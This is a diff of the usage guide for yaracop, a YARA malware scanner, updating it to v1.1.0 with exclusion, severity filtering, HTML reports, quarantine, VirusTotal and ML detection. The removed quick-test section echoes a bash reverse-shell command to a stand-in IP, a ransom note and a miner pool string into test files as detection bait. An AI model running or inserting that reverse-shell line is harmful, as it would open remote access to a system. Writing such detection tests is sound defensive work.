@@ -1,11 +1,11 @@
-# yaracop — Complete Usage Guide (Local)
+# yaracop v1.1.0 — Complete Usage Guide (Local)
 
 ## Table of Contents
 1. Prerequisites
 2. Installation
 3. Quick Test
 4. Basic Scanning
-5. Advanced Scanning
+5. New v1.1.0 Features (`--exclude`, `--max-size`, `--severity`, `--html`, `--quarantine`, `update-rules`, `--vt`, `--ml`)
 6. Watch Mode
 7. Wazuh Integration
 8. Shuffle Integration
@@ -23,13 +23,13 @@ Before using yaracop, make sure you have:
 | Python 3.10+ | `python3 --version` | `sudo apt install python3` |
 | pip | `pip3 --version` | `sudo apt install python3-pip` |
 | YARA library | `python3 -c "import yara"` | `pip install yara-python` |
-| Git (optional) | `git --version` | `sudo apt install git` |
+| Scikit-learn & NumPy | `python3 -c "import sklearn, numpy"` | `pip install scikit-learn numpy` |
 
 ---
 
 ## 2. Installation
 
-### Step 1: Clone or enter directory
+### Step 1: Enter directory
 ```bash
 cd ~/yaracop
 ```
@@ -37,61 +37,24 @@ cd ~/yaracop
 ### Step 2: Install Python dependencies
 ```bash
 pip install -r requirements.txt
-```
-
-If you get `externally-managed-environment` error:
-```bash
+# Or on externally managed environments:
 pip install --break-system-packages -r requirements.txt
 ```
 
 ### Step 3: Verify installation
 ```bash
 python3 scanner.py --help
-```
-
-Expected output:
-```
-usage: scanner.py [-h] {scan,watch} ...
-```
-
-### Step 4: Make scripts executable (optional)
-```bash
-chmod +x scanner.py integration.py
+python3 scanner.py scan --help
 ```
 
 ---
 
-## 3. Quick Test (First Scan)
+## 3. Quick Test (Using Built-in `samples/`)
 
-### Step 1: Create a test folder with fake malware
-```bash
-mkdir -p /tmp/test-malware
-echo "Your files have been encrypted. Pay the ransom in Bitcoin." > /tmp/test-malware/note.txt
-echo "bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'" > /tmp/test-malware/shell.sh
-echo "stratum+tcp://pool.minexmr.com:4444 xmrig" > /tmp/test-malware/miner.txt
-```
-
-### Step 2: Scan the test folder
 ```bash
 cd ~/yaracop
-python3 scanner.py scan --path /tmp/test-malware --rules rules/ --summary
+python3 scanner.py scan --path samples/ --rules rules/ --summary
 ```
-
-### Expected output
-```
-✅ Compiled 1 rule file(s)
-🔍 Scanning 3 file(s)...
-🚨 [critical] Ransomware_Note → /tmp/test-malware/note.txt
-🚨 [critical] Backdoor_ReverseShell → /tmp/test-malware/shell.sh
-🚨 [high] Miner_XMRig → /tmp/test-malware/miner.txt
-
-📊 Summary by severity:
-  critical   : 2
-  high       : 1
-  TOTAL      : 3
-```
-
-If you see this, yaracop is working correctly.
 
 ---
 
@@ -99,119 +62,81 @@ If you see this, yaracop is working correctly.
 
 ### Scan a single file
 ```bash
-python3 scanner.py scan --path /home/user/suspicious.exe --rules rules/
+python3 scanner.py scan --path samples/malware.txt --rules rules/
 ```
 
-### Scan a folder (recursive)
+### Scan a folder (recursive) + JSON + summary
 ```bash
-python3 scanner.py scan --path /home/user/Downloads --rules rules/
-```
-
-### Scan with summary only
-```bash
-python3 scanner.py scan --path /home/user/Downloads --rules rules/ --summary
-```
-
-### Scan and save to JSON
-```bash
-python3 scanner.py scan --path /home/user/Downloads --rules rules/ --json result.json
-```
-
-### Scan + JSON + summary (full)
-```bash
-python3 scanner.py scan --path /home/user/Downloads --rules rules/ --json result.json --summary
-```
-
-### View JSON result
-```bash
-cat result.json
+python3 scanner.py scan --path samples/ --rules rules/ --json result.json --summary
 ```
 
 ---
 
-## 5. Advanced Scanning
+## 5. New v1.1.0 Features
 
-### Scan multiple folders
+### 5.1 `--exclude` — Skip Specific Folders or Files
+Comma-separated list of path substrings to exclude from scanning:
 ```bash
-python3 scanner.py scan --path /home/user/Downloads --rules rules/ --json dl.json
-python3 scanner.py scan --path /home/user/Documents --rules rules/ --json doc.json
+python3 scanner.py scan --path ~/yaracop --rules rules/ --exclude rules,.git,__pycache__,node_modules --summary
 ```
 
-### Merge JSON results
+### 5.2 `--max-size` — Skip Large Files
+Skip files larger than the specified size in MB (default: `100` MB):
 ```bash
-python3 -c "
-import json
-a = json.load(open('dl.json'))
-b = json.load(open('doc.json'))
-json.dump(a + b, open('merged.json', 'w'), indent=2)
-print(f'Merged: {len(a) + len(b)} alerts')
-"
+python3 scanner.py scan --path samples/ --rules rules/ --max-size 50 --summary
 ```
 
-### Scan with custom rules folder
+### 5.3 `--severity` — Filter Alerts by Severity
+Only report alerts matching the comma-separated severities (`critical`, `high`, `medium`, `low`):
 ```bash
-mkdir -p custom-rules
-cat > custom-rules/my-rule.yar << 'EOF'
-rule MyMalware {
-    strings:
-        $a = "evil_string"
-    condition:
-        $a
-}
-EOF
-
-python3 scanner.py scan --path /tmp/test --rules custom-rules/
+python3 scanner.py scan --path samples/ --rules rules/ --severity critical,high --summary
 ```
 
-### Skip folders with rules
-If scanning your home directory, skip `yaracop/rules/` to avoid false positives:
+### 5.4 `--html` — Generate HTML Report
+Create a styled HTML report with severity summary cards and alert table:
 ```bash
-# Scan only Downloads (not entire home)
-python3 scanner.py scan --path /home/user/Downloads --rules rules/
+python3 scanner.py scan --path samples/ --rules rules/ --html /tmp/report.html --summary
+```
+
+### 5.5 `--quarantine` — Quarantine Malicious Files
+Move matched files into a quarantine directory with a `.quarantined` suffix:
+```bash
+mkdir -p /tmp/quarantine
+python3 scanner.py scan --path samples/ --rules rules/ --quarantine /tmp/quarantine
+ls -la /tmp/quarantine/
+```
+
+### 5.6 `update-rules` — Auto-Update YARA Rules
+Backup existing rules to `rules/backup/` and download the latest rules:
+```bash
+python3 scanner.py update-rules
+ls -la rules/
+```
+
+### 5.7 `--vt` — VirusTotal Integration
+Compute SHA256 for matched files and query VirusTotal API for detection ratios:
+```bash
+python3 scanner.py scan --path samples/ --rules rules/ --vt YOUR_VIRUSTOTAL_API_KEY
+```
+
+### 5.8 `--ml` — Machine Learning Heuristic Detection
+Use `scikit-learn` (`RandomForestClassifier` stored in `models/ml_model.pkl`) to detect suspicious files based on file size, Shannon entropy, string count, and suspicious API call count:
+```bash
+python3 scanner.py scan --path samples/ --rules rules/ --ml --summary
 ```
 
 ---
 
 ## 6. Watch Mode (Real-time Detection)
 
-### Start watching a folder
-```bash
-python3 scanner.py watch --path /tmp/test-malware --rules rules/
-```
-
-### Watch + append to JSON
 ```bash
 python3 scanner.py watch --path /tmp/test-malware --rules rules/ --json live.json
 ```
-
-### Test watch mode
-Open another terminal:
-```bash
-echo "Mirai botnet" > /tmp/test-malware/new-file.txt
-```
-
-The watch terminal should print:
-```
-🚨 [critical] Mirai → /tmp/test-malware/new-file.txt
-```
-
-### Stop watching
-Press `Ctrl+C`.
 
 ---
 
 ## 7. Wazuh Integration (Optional)
 
-### Prerequisites
-- Wazuh Manager running (e.g., `https://localhost:55000`)
-- Wazuh API user (default: `wazuh` / `wazuh`)
-
-### Step 1: Scan and save JSON
-```bash
-python3 scanner.py scan --path /tmp/test-malware --rules rules/ --json alerts.json
-```
-
-### Step 2: Send to Wazuh
 ```bash
 python3 integration.py wazuh \
   --alert-file alerts.json \
@@ -220,179 +145,223 @@ python3 integration.py wazuh \
   --password wazuh
 ```
 
-### Expected output
-```
-✅ Sent 2/2 alert(s) to Wazuh
-```
-
-### If Wazuh is not running
-```
-❌ Wazuh error: HTTPSConnectionPool... Connection refused
-```
-
-Fix: Start Wazuh Manager or skip this step.
-
 ---
 
 ## 8. Shuffle Integration (Optional)
 
-### Prerequisites
-- Shuffle instance running (e.g., `http://localhost:3001`)
-- Webhook URL from Shuffle workflow
-
-### Step 1: Create webhook in Shuffle
-1. Open Shuffle UI
-2. Create new workflow
-3. Add Webhook Trigger
-4. Copy webhook URL (e.g., `http://localhost:3001/api/v1/hooks/webhook_abc123`)
-
-### Step 2: Scan and save JSON
-```bash
-python3 scanner.py scan --path /tmp/test-malware --rules rules/ --json alerts.json
-```
-
-### Step 3: Send to Shuffle
 ```bash
 python3 integration.py shuffle \
   --alert-file alerts.json \
   --webhook http://localhost:3001/api/v1/hooks/webhook_abc123
 ```
 
-### Expected output
-```
-✅ Sent 2/2 alert(s) to Shuffle
-```
-
 ---
 
 ## 9. Real-World Scenarios
 
-### Scenario A: Scan downloaded files
+### Scenario A: Full workstation triage with HTML report & ML
 ```bash
-cd ~/Downloads
-python3 ~/yaracop/scanner.py scan --path . --rules ~/yaracop/rules/ --summary
+python3 ~/yaracop/scanner.py scan \
+  --path ~/Downloads \
+  --rules ~/yaracop/rules/ \
+  --exclude .git,node_modules \
+  --max-size 25 \
+  --severity critical,high \
+  --ml \
+  --html ~/scan-report.html \
+  --summary
 ```
 
-### Scenario B: Scan USB drive
+### Scenario B: Automated USB quarantine scan
 ```bash
-ls /media/$USER/
-python3 ~/yaracop/scanner.py scan --path /media/$USER/USB_NAME --rules ~/yaracop/rules/ --summary
-```
-
-### Scenario C: Scan project folder before commit
-```bash
-cd ~/my-project
-python3 ~/yaracop/scanner.py scan --path . --rules ~/yaracop/rules/ --summary
-```
-
-### Scenario D: Daily scan with cron
-```bash
-# Add to crontab
-crontab -e
-
-# Add this line (scan Downloads every day at 2 AM)
-0 2 * * * cd ~/yaracop && python3 scanner.py scan --path ~/Downloads --rules rules/ --json ~/scan-$(date +\%Y\%m\%d).json
-```
-
-### Scenario E: Scan email attachments
-```bash
-# Extract attachments first
-mkdir -p /tmp/attachments
-# ... extract attachments to /tmp/attachments ...
-python3 ~/yaracop/scanner.py scan --path /tmp/attachments --rules ~/yaracop/rules/ --summary
+python3 ~/yaracop/scanner.py scan \
+  --path /media/$USER/USB_DRIVE \
+  --rules ~/yaracop/rules/ \
+  --quarantine /var/quarantine \
+  --json /var/log/yaracop-usb.json \
+  --summary
 ```
 
 ---
 
 ## 10. Troubleshooting
 
-### Error: `ModuleNotFoundError: No module named 'yara'`
+- **`ModuleNotFoundError: No module named 'sklearn'`**: Run `pip install --break-system-packages -r requirements.txt`
+- **False positives when scanning `~/yaracop`**: Use `--exclude rules,.git,__pycache__`
+- **VirusTotal `HTTP 401/403`**: Verify your VirusTotal API key passed to `--vt`
+
+---
+
+**yaracop v1.1.0** — YARA Malware Scanner
+
+---
+
+## 📂 Scanning Other Folders
+
+### Scan Downloads
 ```bash
-pip install yara-python
-# or
-pip install --break-system-packages yara-python
+cd ~/yaracop
+python3 scanner.py scan --path ~/Downloads --rules rules/ --summary
 ```
 
-### Error: `No .yar/.yara files in rules/`
-Check rules folder:
+### Scan Documents
 ```bash
-ls rules/
-```
-If empty, restore from git:
-```bash
-git checkout rules/malware.yar
+python3 scanner.py scan --path ~/Documents --rules rules/ --summary
 ```
 
-### Error: `Path not found`
-Check path exists:
+### Scan Desktop
 ```bash
-ls /path/to/scan
+python3 scanner.py scan --path ~/Desktop --rules rules/ --summary
 ```
 
-### False positives on rules file
-Don't scan `rules/` folder. Scan target folder only:
+### Scan USB Drive
 ```bash
-# Good
-python3 scanner.py scan --path /tmp/test --rules rules/
+ls /media/$USER/
+python3 scanner.py scan --path /media/$USER/USB_NAME --rules rules/ --summary
+```
 
-# Bad (scans rules themselves)
+### Scan Entire Home (safe mode)
+```bash
+python3 scanner.py scan --path ~ --rules rules/ \
+  --exclude .git,__pycache__,node_modules,.cache,.local,rules \
+  --max-size 50 \
+  --summary
+```
+
+### Scan Single File
+```bash
+python3 scanner.py scan --path ~/Downloads/suspicious.exe --rules rules/ --summary
+```
+
+### Scan Project Before Commit
+```bash
+cd ~/my-project
+python3 ~/yaracop/scanner.py scan --path . --rules ~/yaracop/rules/ --summary
+```
+
+---
+
+## 🎯 Combo Examples
+
+### Full scan (all features)
+```bash
+python3 scanner.py scan --path ~/Downloads --rules rules/ \
+  --exclude .git,__pycache__ \
+  --max-size 50 \
+  --severity critical,high \
+  --json hasil.json \
+  --html report.html \
+  --quarantine /tmp/quarantine \
+  --ml \
+  --summary
+```
+
+### Scan + JSON + HTML
+```bash
+python3 scanner.py scan --path ~/Downloads --rules rules/ \
+  --json hasil.json --html report.html --summary
+```
+
+### Watch + JSON (real-time)
+```bash
+python3 scanner.py watch --path ~/Downloads --rules rules/ --json live.json
+```
+
+---
+
+## 🌍 Real-World Scenarios
+
+### Scenario A: Scan downloaded file
+```bash
+cd ~/Downloads
+python3 ~/yaracop/scanner.py scan --path . --rules ~/yaracop/rules/ --summary
+```
+
+### Scenario B: Scan USB from friend
+```bash
+ls /media/$USER/
+python3 ~/yaracop/scanner.py scan --path /media/$USER/USB_NAME \
+  --rules ~/yaracop/rules/ --quarantine /tmp/quarantine --summary
+```
+
+### Scenario C: Daily scan with cron
+```bash
+crontab -e
+# Add this line (scan Downloads every day at 2 AM):
+0 2 * * * cd ~/yaracop && python3 scanner.py scan --path ~/Downloads --rules rules/ --json ~/scan-$(date +\%Y\%m\%d).json --summary >> ~/scan.log 2>&1
+```
+
+### Scenario D: Scan email attachments
+```bash
+mkdir -p /tmp/attachments
+# Extract attachments to /tmp/attachments first
+python3 ~/yaracop/scanner.py scan --path /tmp/attachments --rules ~/yaracop/rules/ --summary
+```
+
+---
+
+## 🐛 Troubleshooting (Expanded)
+
+### False positive on rules/ folder
+```bash
+# BAD
 python3 scanner.py scan --path ~/yaracop --rules rules/
+
+# GOOD
+python3 scanner.py scan --path ~/yaracop --rules rules/ --exclude rules,.git,__pycache__
 ```
 
 ### Scan is slow
-- Skip large files: scan specific folders only
-- Skip binary files: use `find` to filter first
+- Use `--max-size 50` to skip large files
+- Use `--exclude` to skip large folders
+- Scan specific folders only (not entire home)
+
+### File not detected
+- YARA only reads raw bytes (not ZIP/PDF inside)
+- Extract archives first, then scan
+- File might not match any rule
+
+### Quarantine file not coming back
 ```bash
-find /path -type f -name "*.exe" -o -name "*.dll" | while read f; do
-    python3 scanner.py scan --path "$f" --rules rules/
-done
+cp /tmp/quarantine/malware.txt.quarantined ~/yaracop/samples/malware.txt
 ```
 
-### Wazuh auth failed
-- Check Wazuh Manager is running: `curl -k https://localhost:55000`
-- Check credentials: default `wazuh` / `wazuh`
-- Check API enabled in `ossec.conf`: `<api><enabled>yes</enabled></api>`
-
-### Shuffle webhook failed
-- Check Shuffle is running: `curl http://localhost:3001`
-- Check webhook URL is correct
-- Check network connectivity
-
-### JSON output empty
-No matches found. Check:
-- Rules are loaded: `✅ Compiled N rule file(s)`
-- Target folder has files: `🔍 Scanning N file(s)...`
-- Files contain patterns from rules
+### No matches found
+- Check rules loaded: `✅ Compiled N rule file(s)`
+- Check target files: `🔍 Scanning N file(s)...`
+- Files might be clean
 
 ---
 
-## Quick Reference Card
+## 📊 Example Outputs
 
+### Scan Downloads
 ```
-┌─────────────────────────────────────────────────────────────┐
-│  yaracop — Quick Reference                                  │
-├─────────────────────────────────────────────────────────────┤
-│  Scan folder:    scanner.py scan --path DIR --rules rules/  │
-│  Scan + JSON:    scanner.py scan --path DIR --rules rules/  │
-│                  --json out.json                            │
-│  Scan + summary: scanner.py scan --path DIR --rules rules/  │
-│                  --summary                                  │
-│  Watch mode:     scanner.py watch --path DIR --rules rules/ │
-│  Wazuh:          integration.py wazuh --alert-file F        │
-│  Shuffle:        integration.py shuffle --alert-file F      │
-│                  --webhook URL                              │
-└─────────────────────────────────────────────────────────────┘
+✅ Compiled 3 rule file(s)
+🔍 Scanning 25 file(s)...
+🚨 [critical] Mirai → /home/user/Downloads/suspicious.exe
+🚨 [high] Trojan_Generic → /home/user/Downloads/crack.dll
+
+📊 Summary by severity:
+  critical   : 1
+  high       : 1
+  TOTAL      : 2
 ```
 
----
+### HTML Report
+```
+📄 HTML report saved to: /tmp/report.html
+```
 
-## Next Steps
+### ML Detection
+```
+🤖 Trained ML model saved to: models/ml_model.pkl
+[ML] suspicious: samples/malware.txt (score: 0.96)
+[ML] suspicious: samples/suspicious.txt (score: 1.00)
+```
 
-- Add custom YARA rules: create `rules/custom.yar`
-- Integrate with Wazuh Manager (see Section 7)
-- Integrate with Shuffle SOAR (see Section 8)
-- Contribute to yaracop: https://github.com/InfraSecID/yaracop
+### Quarantine
+```
+🔒 Quarantined: samples/malware.txt → /tmp/quarantine/malware.txt.quarantined
+```
 
----
-
-**yaracop v1.0.0** — YARA Malware Scanner
